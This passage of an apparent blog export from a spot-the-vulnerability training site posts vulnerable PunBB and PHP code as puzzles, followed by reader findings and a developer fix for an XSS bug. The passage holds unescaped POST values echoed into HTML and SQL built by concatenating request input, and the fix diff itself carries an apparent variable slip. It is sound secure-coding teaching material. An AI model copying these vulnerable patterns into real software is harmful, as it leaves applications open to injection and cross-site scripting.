if ( $err_code=='400'||$err_code=='403'||$err_code=='405'||$err_code[0]=='5'){
 @header(&quot;Connection: close&quot;, 1);
 if ($err_code == '405') @header('Allow: GET,HEAD,POST,OPTIONS,TRACE');
 echo &quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//IETF//DTD HTML 2.0//EN\&quot;&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;{$err_code} {$err_phrase}&lt;/title&gt;\n&lt;h1&gt;{$err_phrase}&lt;/h1&gt;\n&lt;p&gt;{$err_body}&lt;br&gt;\n&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;&quot;;
} else echo '&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;
       &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;title&gt;'.$err_code.' '.$err_phrase.'&lt;/title&gt;
  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;'.$err_code.' '.$err_phrase.'&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;
'.$err_body.'&lt;br /&gt;
&lt;/p&gt;
&lt;pre&gt;
-'.print_r($_SERVER,1).'
&lt;/pre&gt;
  &lt;/body&gt;
&lt;/html&gt;';
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1248</wp:post_id>
		<wp:post_date>2010-12-17 08:00:12</wp:post_date>
		<wp:post_date_gmt>2010-12-17 15:00:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>last-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="apache-status"><![CDATA[apache status]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="echoes"><![CDATA[echoes]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="rigorous-security"><![CDATA[rigorous security]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="web-application"><![CDATA[web application]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/eBRsih]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[9b9c6b0100c1e134a761d785d80b6617]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Price</title>
		<link>http://spotthevuln.com/2010/12/price/</link>
		<pubDate>Mon, 20 Dec 2010 15:00:31 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1253</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Courage is the price that life exacts for granting peace.</strong> <br><strong> - Amelia Earhart
</strong></blockquote>
<pre lang="php">
<?php
... <snip> ...

if (isset($_GET['action']) || isset($_POST['prune']) || isset($_POST['prune_comply']))
{
	if (isset($_POST['prune_comply']))
	{
		confirm_referrer('admin_prune.php');

		$prune_from = $_POST['prune_from'];
		$prune_days = intval($_POST['prune_days']);
		$prune_date = ($prune_days) ? time() - ($prune_days*86400) : -1;

		@set_time_limit(0);

		if ($prune_from == 'all')
		{
			$result = $db->query('SELECT id FROM '.$db->prefix.'forums') or error('Unable to fetch forum list', __FILE__, __LINE__, $db->error());
			$num_forums = $db->num_rows($result);

			for ($i = 0; $i < $num_forums; ++$i)
			{
				$fid = $db->result($result, $i);

				prune($fid, $_POST['prune_sticky'], $prune_date);
				update_forum($fid);
			}
		}
		else
		{
			$prune_from = intval($prune_from);
			prune($prune_from, $_POST['prune_sticky'], $prune_date);
			update_forum($prune_from);
		}

		// Locate any "orphaned redirect topics" and delete them
		$result = $db->query('SELECT t1.id FROM '.$db->prefix.'topics AS t1 LEFT JOIN '.$db->prefix.'topics AS t2 ON t1.moved_to=t2.id WHERE t2.id IS NULL AND t1.moved_to IS NOT NULL') or error('Unable to fetch redirect topics', __FILE__, __LINE__, $db->error());
		$num_orphans = $db->num_rows($result);

		if ($num_orphans)
		{
			for ($i = 0; $i < $num_orphans; ++$i)
				$orphans[] = $db->result($result, $i);

			$db->query('DELETE FROM '.$db->prefix.'topics WHERE id IN('.implode(',', $orphans).')') or error('Unable to delete redirect topics', __FILE__, __LINE__, $db->error());
		}

		redirect('admin_prune.php', 'Posts pruned. Redirecting &hellip;');
	}


	$prune_days = $_POST['req_prune_days'];
	if (!@preg_match('#^\d+$#', $prune_days))
		message('Days to prune must be a positive integer.');

	$prune_date = time() - ($prune_days*86400);
	$prune_from = $_POST['prune_from'];

	// Concatenate together the query for counting number or topics to prune
	$sql = 'SELECT COUNT(id) FROM '.$db->prefix.'topics WHERE last_post<'.$prune_date.' AND moved_to IS NULL';

	if ($_POST['prune_sticky'] == '0')
		$sql .= ' AND sticky=\'0\'';

	if ($prune_from != 'all')
	{
		$prune_from = intval($prune_from);
		$sql .= ' AND forum_id='.$prune_from;

		// Fetch the forum name (just for cosmetic reasons)
		$result = $db->query('SELECT forum_name FROM '.$db->prefix.'forums WHERE id='.$prune_from) or error('Unable to fetch forum name', __FILE__, __LINE__, $db->error());
		$forum = '"'.pun_htmlspecialchars($db->result($result)).'"';
	}
	else
		$forum = 'all forums';

	$result = $db->query($sql) or error('Unable to fetch topic prune count', __FILE__, __LINE__, $db->error());
	$num_topics = $db->result($result);

	if (!$num_topics)
		message('There are no topics that are '.$prune_days.' days old. Please decrease the value of "Days old" and try again.');


	$page_title = pun_htmlspecialchars($pun_config['o_board_title']).' / Admin / Prune';
	require PUN_ROOT.'header.php';

	generate_admin_menu('prune');

?>
	<div class="blockform">
		<h2><span>Prune</span></h2>
		<div class="box">
			<form method="post" action="admin_prune.php?action=foo">
				<div class="inform">
					<input type="hidden" name="prune_days" value="<?php echo $prune_days ?>" />
					<input type="hidden" name="prune_sticky" value="<?php echo $_POST['prune_sticky'] ?>" />
					<input type="hidden" name="prune_from" value="<?php echo $prune_from ?>" />
					<fieldset>
						<legend>Confirm prune posts</legend>
						<div class="infldset">
							<p>Are you sure that you want to prune all topics older than <?php echo $prune_days ?> days from <?php echo $forum ?>? (<?php echo $num_topics ?> topics)</p>
							<p>WARNING! Pruning posts deletes them permanently.</p>
						</div>
					</fieldset>
				</div>
				<p><input type="submit" name="prune_comply" value="Prune" /><a href="javascript:history.go(-1)">Go back</a></p>
			</form>
		</div>
	</div>
	<div class="clearer"></div>
</div>
... <snip> ...
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1253</wp:post_id>
		<wp:post_date>2010-12-20 08:00:31</wp:post_date>
		<wp:post_date_gmt>2010-12-20 15:00:31</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>price</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dMfa1J]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[2282b8d74bec96b58d204a445915d1ab]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1348</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PunBB, Solution Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/12/price-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-12-24 12:01:09</wp:comment_date>
			<wp:comment_date_gmt>2010-12-24 19:01:09</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Price [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1293786785.3821";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1293217269.6365";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1347</wp:comment_id>
			<wp:comment_author><![CDATA[xtreme]]></wp:comment_author>
			<wp:comment_author_email>sachinrawat_jbp@yahoo.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>117.254.151.120</wp:comment_author_IP>
			<wp:comment_date>2010-12-24 05:45:06</wp:comment_date>
			<wp:comment_date_gmt>2010-12-24 12:45:06</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[1. SQL Injection in the following code fragment through --- $prune_from = $_POST['prune_from'];
// Fetch the forum name (just for cosmetic reasons)
		$result = $db-&gt;query('SELECT forum_name FROM '.$db-&gt;prefix.'forums WHERE id='.$prune_from) or error('Unable to fetch forum name', __FILE__, __LINE__, $db-&gt;error());
		$forum = '"'.pun_htmlspecialchars($db-&gt;result($result)).'"';

2. XSS in the following code : $_POST['prune_sticky'] and $prune_from
&lt;input type=&quot;hidden&quot; name=&quot;prune_sticky&quot; value=&quot;" /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;prune_from&quot; value=&quot;" /&gt;]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1293786779.8557";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1293194706.5047";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Price - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/12/price-cross-site-scripting/</link>
		<pubDate>Fri, 24 Dec 2010 19:01:04 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1259</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: PunBB

Fixed in Version: 2.1

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Price" href="http://spotthevuln.com/2010/12/price/" target="_blank">Found    Here</a>
<h3>Description</h3>
This week’s vulnerability was a XSS bug in PunBB.  PunBB was taking an un-trusted value directly from the POST parameter ($_POST[‘prune_sticky’]) and echoing the un-trusted value directly into a value attribute for a hidden form input field.  You can see the XSS bug in line 98.  This echoing of un-trusted input results in XSS.

The PunBB developers did something I really like here.  Instead of fixing the single instance of XSS and moving on, the PunBB developers went a step further and hardened the use of $_POST[‘prune_sticky’].  Instead of allowing users/attacker to provide arbitrary values for $_POST[’prune_sticky’] they restricted the acceptable values to 1 or 0.  You can see this fix in line 11.  This is a perfect example of root cause analysis in action.  The PunBB developers took a few minutes to understand how the application uses $_POST[‘ prune_sticky’] and adjusted the application behavior to protect against other attacks while being transparent to the user.  This patch submitted by the PunBB developers goes a long way in protecting their customers and is a great example of being smart about security fixes.  
<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="11,26,27,34,35,64,65,98,99"]
&lt;?php
... &lt;snip&gt; ...

if (isset($_GET['action']) || isset($_POST['prune']) || isset($_POST['prune_comply']))
{
	if (isset($_POST['prune_comply']))
	{
		confirm_referrer('admin_prune.php');

		$prune_from = $_POST['prune_from'];
+		$prune_sticky = isset($_POST['prune_sticky']) ? '1' : '0'; 		
		$prune_days = intval($_POST['prune_days']);
		$prune_date = ($prune_days) ? time() - ($prune_days*86400) : -1;

		@set_time_limit(0);

		if ($prune_from == 'all')
		{
			$result = $db-&gt;query('SELECT id FROM '.$db-&gt;prefix.'forums') or error('Unable to fetch forum list', __FILE__, __LINE__, $db-&gt;error());
			$num_forums = $db-&gt;num_rows($result);

			for ($i = 0; $i &lt; $num_forums; ++$i)
			{
				$fid = $db-&gt;result($result, $i);

-				prune($fid, $_POST['prune_sticky'], $prune_date);
+				prune($fid, $prune_sticky, $prune_date);
				update_forum($fid);
			}
		}
		else
		{
			$prune_from = intval($prune_from);
-			prune($prune_from, $_POST['prune_sticky'], $prune_date);
+			prune($fid, $prune_sticky, $prune_date);
			update_forum($prune_from);
		}

		// Locate any &quot;orphaned redirect topics&quot; and delete them
		$result = $db-&gt;query('SELECT t1.id FROM '.$db-&gt;prefix.'topics AS t1 LEFT JOIN '.$db-&gt;prefix.'topics AS t2 ON t1.moved_to=t2.id WHERE t2.id IS NULL AND t1.moved_to IS NOT NULL') or error('Unable to fetch redirect topics', __FILE__, __LINE__, $db-&gt;error());
		$num_orphans = $db-&gt;num_rows($result);

		if ($num_orphans)
		{
			for ($i = 0; $i &lt; $num_orphans; ++$i)
				$orphans[] = $db-&gt;result($result, $i);

			$db-&gt;query('DELETE FROM '.$db-&gt;prefix.'topics WHERE id IN('.implode(',', $orphans).')') or error('Unable to delete redirect topics', __FILE__, __LINE__, $db-&gt;error());
		}

		redirect('admin_prune.php', 'Posts pruned. Redirecting &amp;hellip;');
	}


	$prune_days = $_POST['req_prune_days'];
	if (!@preg_match('#^\d+$#', $prune_days))
		message('Days to prune must be a positive integer.');

	$prune_date = time() - ($prune_days*86400);
	$prune_from = $_POST['prune_from'];

	// Concatenate together the query for counting number or topics to prune
	$sql = 'SELECT COUNT(id) FROM '.$db-&gt;prefix.'topics WHERE last_post&lt;'.$prune_date.' AND moved_to IS NULL';

-	if ($_POST['prune_sticky'] == '0')
+	if (!$prune_sticky) 
		$sql .= ' AND sticky=\'0\'';

	if ($prune_from != 'all')
	{
		$prune_from = intval($prune_from);
		$sql .= ' AND forum_id='.$prune_from;

		// Fetch the forum name (just for cosmetic reasons)
		$result = $db-&gt;query('SELECT forum_name FROM '.$db-&gt;prefix.'forums WHERE id='.$prune_from) or error('Unable to fetch forum name', __FILE__, __LINE__, $db-&gt;error());
		$forum = '&quot;'.pun_htmlspecialchars($db-&gt;result($result)).'&quot;';
	}
	else
		$forum = 'all forums';

	$result = $db-&gt;query($sql) or error('Unable to fetch topic prune count', __FILE__, __LINE__, $db-&gt;error());
	$num_topics = $db-&gt;result($result);

	if (!$num_topics)
		message('There are no topics that are '.$prune_days.' days old. Please decrease the value of &quot;Days old&quot; and try again.');


	$page_title = pun_htmlspecialchars($pun_config['o_board_title']).' / Admin / Prune';
	require PUN_ROOT.'header.php';

	generate_admin_menu('prune');

?&gt;
	&lt;div class=&quot;blockform&quot;&gt;
		&lt;h2&gt;&lt;span&gt;Prune&lt;/span&gt;&lt;/h2&gt;
		&lt;div class=&quot;box&quot;&gt;
			&lt;form method=&quot;post&quot; action=&quot;admin_prune.php?action=foo&quot;&gt;
				&lt;div class=&quot;inform&quot;&gt;
					&lt;input type=&quot;hidden&quot; name=&quot;prune_days&quot; value=&quot;&lt;?php echo $prune_days ?&gt;&quot; /&gt;
-					&lt;input type=&quot;hidden&quot; name=&quot;prune_sticky&quot; value=&quot;&lt;?php echo $_POST['prune_sticky'] ?&gt;&quot; /&gt;
+					&lt;input type=&quot;hidden&quot; name=&quot;prune_sticky&quot; value=&quot;&lt;?php echo $prune_sticky ?&gt;&quot; /&gt; 
					&lt;input type=&quot;hidden&quot; name=&quot;prune_from&quot; value=&quot;&lt;?php echo $prune_from ?&gt;&quot; /&gt;
					&lt;fieldset&gt;
						&lt;legend&gt;Confirm prune posts&lt;/legend&gt;
						&lt;div class=&quot;infldset&quot;&gt;
							&lt;p&gt;Are you sure that you want to prune all topics older than &lt;?php echo $prune_days ?&gt; days from &lt;?php echo $forum ?&gt;? (&lt;?php echo $num_topics ?&gt; topics)&lt;/p&gt;
							&lt;p&gt;WARNING! Pruning posts deletes them permanently.&lt;/p&gt;
						&lt;/div&gt;
					&lt;/fieldset&gt;
				&lt;/div&gt;
				&lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;prune_comply&quot; value=&quot;Prune&quot; /&gt;&lt;a href=&quot;javascript:history.go(-1)&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
			&lt;/form&gt;
		&lt;/div&gt;
	&lt;/div&gt;
	&lt;div class=&quot;clearer&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
... &lt;snip&gt; ...
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1259</wp:post_id>
		<wp:post_date>2010-12-24 12:01:04</wp:post_date>
		<wp:post_date_gmt>2010-12-24 19:01:04</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>price-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="post_tag" nicename="input-field"><![CDATA[input field]]></category>
		<category domain="post_tag" nicename="input-results"><![CDATA[input results]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="punbb"><![CDATA[PunBB]]></category>
		<category domain="post_tag" nicename="root-cause-analysis"><![CDATA[root cause analysis]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/ifb5cy]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c17b7f36e0d0d347a80e399f5415bd21]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1350</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Cross-Site Scripting (XSS), PunBB, Solution Vulnerability Code Example ~SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2010/12/price-cross-site-scripting/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2010-12-24 15:25:34</wp:comment_date>
			<wp:comment_date_gmt>2010-12-24 22:25:34</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by Heinz Militar, Spot The Vuln. Spot The Vuln said: New Post: Price - Cross Site Scripting http://bit.ly/ifb5cy #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1293786789.7884";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1293229534.7848";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Tougher</title>
		<link>http://spotthevuln.com/2010/12/tougher/</link>
		<pubDate>Mon, 27 Dec 2010 16:16:39 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1263</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I survived because I was tougher than anybody else.</strong> <br><strong> - Bette Davis
</strong></blockquote>
[sourcecode language="php"]
...&lt;snip&gt;...

// Load the admin.php language file
require FORUM_ROOT.'lang/'.$forum_user['language'].'/admin_common.php';
require FORUM_ROOT.'lang/'.$forum_user['language'].'/admin_settings.php';

$section = isset($_GET['section']) ? $_GET['section'] : null;


if (isset($_POST['form_sent']))
{
	$form = array_map('trim', $_POST['form']);

	($hook = get_hook('aop_form_submitted')) ? eval($hook) : null;

...&lt;snip&gt;...

	($hook = get_hook('aop_pre_update_configuration')) ? eval($hook) : null;

	foreach ($form as $key =&gt; $input)
	{
		// Only update permission values that have changed
		if (array_key_exists('p_'.$key, $forum_config) &amp;&amp; $forum_config['p_'.$key] != $input)
		{
			$query = array(
				'UPDATE'	=&gt; 'config',
				'SET'		=&gt; 'conf_value='.$input,
				'WHERE'		=&gt; 'conf_name=\'p_'.$forum_db-&gt;escape($key).'\''
			);

			($hook = get_hook('aop_qr_update_permission_conf')) ? eval($hook) : null;
			$forum_db-&gt;query_build($query) or error(__FILE__, __LINE__);
		}

		// Only update option values that have changed
		if (array_key_exists('o_'.$key, $forum_config) &amp;&amp; $forum_config['o_'.$key] != $input)
		{
			if ($input != '' || is_int($input))
				$value = '\''.$forum_db-&gt;escape($input).'\'';
			else
				$value = 'NULL';

			$query = array(
				'UPDATE'	=&gt; 'config',
				'SET'		=&gt; 'conf_value='.$value,
				'WHERE'		=&gt; 'conf_name=\'o_'.$forum_db-&gt;escape($key).'\''
			);

			($hook = get_hook('aop_qr_update_permission_option')) ? eval($hook) : null;
			$forum_db-&gt;query_build($query) or error(__FILE__, __LINE__);
		}
	}

	// Regenerate the config cache
	if (!defined('FORUM_CACHE_FUNCTIONS_LOADED'))
		require FORUM_ROOT.'include/cache.php';

	generate_config_cache();

	($hook = get_hook('aop_pre_redirect')) ? eval($hook) : null;

	redirect(forum_link($forum_url['admin_settings_'.$section]), $lang_admin_settings['Settings updated'].' '.$lang_admin_common['Redirect']);
}


if (!$section || $section == 'setup')
{
	// Setup the form
	$forum_page['group_count'] = $forum_page['item_count'] = $forum_page['fld_count'] = 0;

	// Setup breadcrumbs
	$forum_page['crumbs'] = array(
		array($forum_config['o_board_title'], forum_link($forum_url['index'])),
		array($lang_admin_common['Forum administration'], forum_link($forum_url['admin_index'])),
		array($lang_admin_common['Settings'], forum_link($forum_url['admin_settings_setup'])),
		array($lang_admin_common['Setup'], forum_link($forum_url['admin_settings_setup']))
	);

	($hook = get_hook('aop_setup_pre_header_load')) ? eval($hook) : null;

	define('FORUM_PAGE_SECTION', 'settings');
	define('FORUM_PAGE', 'admin-settings-setup');
	require FORUM_ROOT.'header.php';

	// START SUBST - &lt;!-- forum_main --&gt;
	ob_start();

	($hook = get_hook('aop_setup_output_start')) ? eval($hook) : null;

?&gt;
	&lt;div class=&quot;main-content main-frm&quot;&gt;
		&lt;form class=&quot;frm-form&quot; method=&quot;post&quot; accept-charset=&quot;utf-8&quot; action=&quot;&lt;?php echo forum_link($forum_url['admin_settings_setup']) ?&gt;&quot;&gt;
			&lt;div class=&quot;hidden&quot;&gt;
				&lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;&lt;?php echo generate_form_token(forum_link($forum_url['admin_settings_setup'])) ?&gt;&quot; /&gt;
				&lt;input type=&quot;hidden&quot; name=&quot;form_sent&quot; value=&quot;1&quot; /&gt;
			&lt;/div&gt;
				&lt;div class=&quot;content-head&quot;&gt;
					&lt;h2 class=&quot;hn&quot;&gt;&lt;span&gt;&lt;?php echo $lang_admin_settings['Setup personal'] ?&gt;&lt;/span&gt;&lt;/h2&gt;
				&lt;/div&gt;

...&lt;snip&gt;...
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1263</wp:post_id>
		<wp:post_date>2010-12-27 09:16:39</wp:post_date>
		<wp:post_date_gmt>2010-12-27 16:16:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>tougher</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
